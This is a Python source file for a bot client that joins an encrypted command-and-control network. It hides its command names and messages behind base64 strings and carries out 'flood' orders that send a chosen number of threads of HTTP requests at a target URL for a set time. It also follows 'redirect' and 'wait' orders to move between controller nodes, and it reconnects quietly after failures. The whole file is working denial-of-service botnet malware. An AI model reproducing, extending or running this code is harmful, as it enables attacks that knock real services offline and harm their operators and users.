import socket
import time
import json
from .crypto import Crypto
from .utilities import parse_url, _decode_str
from .utilities import NetworkUtilities, Endpoint

# Client Class
class Client:
    def __init__(self, host=_decode_str("MTI3LjAuMC4x"), port=547):
        self.server_host = host
        self.server_port = port
        self.crypto = Crypto()
        self.private_key, self.public_key = self.crypto.generate_rsa_keys()
        self.sock = None
        self.redirects = 0
        self.max_redirects = 5
        self.running = True

    # Connect to server
    def connect(self):
        while self.running and self.redirects < self.max_redirects:
            try:
                # Create and connect socket
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_host, self.server_port))

                # Receive server public key
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    raise ConnectionError(_decode_str("RmFpbGVkIHRvIHJlY2VpdmUgc2VydmVyIHB1YmxpYyBrZXkgbGVuZ3Ro"))
                server_pubkey_len = int.from_bytes(length_bytes, 'big')
                server_pubkey_pem = self._recv_n_bytes(server_pubkey_len)
                if not server_pubkey_pem:
                    raise ConnectionError(_decode_str("RmFpbGVkIHRvIHJlY2VpdmUgc2VydmVyIHB1YmxpYyBrZXk="))

                self.server_public_key = self.crypto.load_public_key(server_pubkey_pem)

                # Send own public key to server
                pubkey_pem = self.crypto.serialize_public_key(self.public_key)
                self.sock.sendall(len(pubkey_pem).to_bytes(2, 'big') + pubkey_pem)

                # Send initialization message
                init_message = {_decode_str("cm9sZQ=="): _decode_str("Y2xpZW50")}  # Indicates not C2
                init_message_bytes = json.dumps(init_message).encode()
                self.sock.sendall(len(init_message_bytes).to_bytes(2, 'big') + init_message_bytes)

                # Receive initialization confirmation
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    raise ConnectionError(_decode_str("RmFpbGVkIHRvIHJlY2VpdmUgaW5pdCBjb25maXJtYXRpb24gbGVuZ3Ro"))
                init_len = int.from_bytes(length_bytes, 'big')
                init_confirmation = self._recv_n_bytes(init_len)
                if not init_confirmation:
                    raise ConnectionError(_decode_str("RmFpbGVkIHRvIHJlY2VpdmUgaW5pdCBjb25maXJtYXRpb24="))
                init_data = json.loads(init_confirmation.decode())
                if init_data.get(_decode_str("c3RhdHVz")) != _decode_str("c3VjY2Vzcw=="):
                    raise ConnectionError(f"{_decode_str('SW5pdGlhbGl6YXRpb24gZmFpbGVkOiA=')} {init_data.get(_decode_str('bWVzc2FnZQ=='))}")

                # Start listening for messages from server
                self._listen_server()

            except (ConnectionRefusedError, socket.timeout, ConnectionError, OSError) as e:
                time.sleep(5)
            except json.JSONDecodeError as e:
                self.close()
                break
            except Exception as e:
                self.close()
                break
            finally:
                if self.sock:
                    try:
                        self.sock.close()
                    except Exception as e:
                        pass
                    self.sock = None

    # Listen for server messages
    def _listen_server(self):
        try:
            while self.running:
                # Receive encrypted session key
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    break
                encrypted_session_key_len = int.from_bytes(length_bytes, 'big')
                encrypted_session_key = self._recv_n_bytes(encrypted_session_key_len)
                if not encrypted_session_key:
                    break

                # Receive encrypted message
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    break
                encrypted_msg_len = int.from_bytes(length_bytes, 'big')
                encrypted_msg = self._recv_n_bytes(encrypted_msg_len)
                if not encrypted_msg:
                    break

                # Decrypt message
                session_key = self.crypto.rsa_decrypt(self.private_key, encrypted_session_key)
                message = self.crypto.aes_decrypt(session_key, encrypted_msg).decode()

                # Send ACK
                encrypted_ack = self.crypto.rsa_encrypt(self.server_public_key, _decode_str("QUNL").encode())
                self.sock.sendall(len(encrypted_ack).to_bytes(2, 'big') + encrypted_ack)

                # Process command
                try:
                    msg_json = json.loads(message)
                    command = msg_json.get(_decode_str("YWN0aW9u"))

                    if command == _decode_str("Zmxvb2Q="):
                        NetworkUtilities().execute_request(
                            parse_url(msg_json[_decode_str("ZGF0YQ==")][_decode_str("dXJs")]),
                            int(msg_json[_decode_str("ZGF0YQ==")][_decode_str("ZHVyYXRpb24=")]),
                            msg_json[_decode_str("ZGF0YQ==")][_decode_str("bWV0aG9k")],
                            int(msg_json[_decode_str("ZGF0YQ==")][_decode_str("dGhyZWFkcw==")])
                        )

                    elif command == _decode_str("cmVkaXJlY3Q="):
                        current_node = f"{self.server_host}:{self.server_port}"
                        new_host = msg_json[_decode_str("ZGF0YQ==")][_decode_str("aG9zdA==")]
                        new_port = msg_json[_decode_str("ZGF0YQ==")][_decode_str("cG9ydA==")]
                        new_node = f"{new_host}:{new_port}"
                        if new_node != current_node:
                            self.server_host = new_host
                            self.server_port = new_port
                            self.redirects += 1
                            self.sock.close()
                            self.connect()  # Reconnect to new server
                        else:
                            self.close()

                    elif command == _decode_str("d2FpdA=="):
                        wait_s = msg_json[_decode_str("ZGF0YQ==")][_decode_str("cw==")]
                        self.sock.close()
                        time.sleep(wait_s)
                        self.connect()  # Reconnect after wait

                except KeyError as e:
                    pass
                except json.JSONDecodeError as e:
                    pass

        except Exception as e:
            pass

        finally:
            if self.sock:
                self.sock.close()
                self.sock = None

    # Helper: Receive exact number of bytes
    def _recv_n_bytes(self, n):
        data = b''
        while len(data) < n:
            try:
                chunk = self.sock.recv(n - len(data))
                if not chunk:
                    return None
            except socket.timeout:
                return None
            data += chunk
        return data

    # Close client
    def close(self):
        self.running = False
        if self.sock:
            self.sock.close()
            self.sock = None